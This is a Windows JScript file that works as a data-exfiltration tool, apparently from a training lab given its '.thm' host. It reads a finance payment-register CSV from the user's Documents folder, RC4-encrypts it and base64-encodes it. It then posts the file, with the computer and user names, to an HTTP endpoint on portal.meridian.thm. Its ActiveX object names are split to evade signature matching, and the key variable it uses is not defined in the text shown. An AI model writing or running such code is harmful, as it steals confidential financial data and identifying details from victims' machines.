var args=WScript.Arguments;
var shell=new ActiveXObject("WScript."+"Shell"),fs=new ActiveXObject("Scripting."+"FileSystemObject");
var source=shell.ExpandEnvironmentStrings("%USERPROFILE%")+"\\Documents\\Finance\\payment-register.csv";
if(args.length!=1||!fs.FileExists(source))WScript.Quit(0);
var h=cacheToken,k=[];for(var n=0;n<h.length;n+=2)k.push(parseInt(h.substr(n,2),16));
var handle=fs.OpenTextFile(source,1,false),content=handle.ReadAll();handle.Close();
var input=[];for(var n=0;n<content.length;n++)input.push(content.charCodeAt(n)&255);
function transform(a,k){var s=[],j=0,i,t,o=[];for(i=0;i<256;i++)s[i]=i;for(i=0;i<256;i++){j=(j+s[i]+k[i%k.length])&255;t=s[i];s[i]=s[j];s[j]=t;}i=0;j=0;for(var n=0;n<a.length;n++){i=(i+1)&255;j=(j+s[i])&255;t=s[i];s[i]=s[j];s[j]=t;o.push(a[n]^s[(s[i]+s[j])&255]);}return o;}
function b64(a){var alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",s="";for(var n=0;n<a.length;n+=3){var v=(a[n]<<16)|((a[n+1]||0)<<8)|(a[n+2]||0);s+=alphabet.charAt((v>>>18)&63)+alphabet.charAt((v>>>12)&63)+(n+1<a.length?alphabet.charAt((v>>>6)&63):"=")+(n+2<a.length?alphabet.charAt(v&63):"=");}return s;}
function q(s){return '"'+s.replace(/\\/g,"\\\\").replace(/"/g,'\\"')+'"';}
var envelope='{"reference":'+q(args.Item(0))+',"workstation":'+q(shell.ExpandEnvironmentStrings("%COMPUTERNAME%"))+',"user":'+q(shell.ExpandEnvironmentStrings("%USERNAME%"))+',"document":'+q(fs.GetFileName(source))+',"data":'+q(b64(transform(input,k)))+'}';
var request=new ActiveXObject("MSXML2."+"XMLHTTP.6.0");
request.open("POST","http://portal.meridian.thm:8080/api/receipt",false);
request.setRequestHeader("Content-Type","application/json");request.send(envelope);
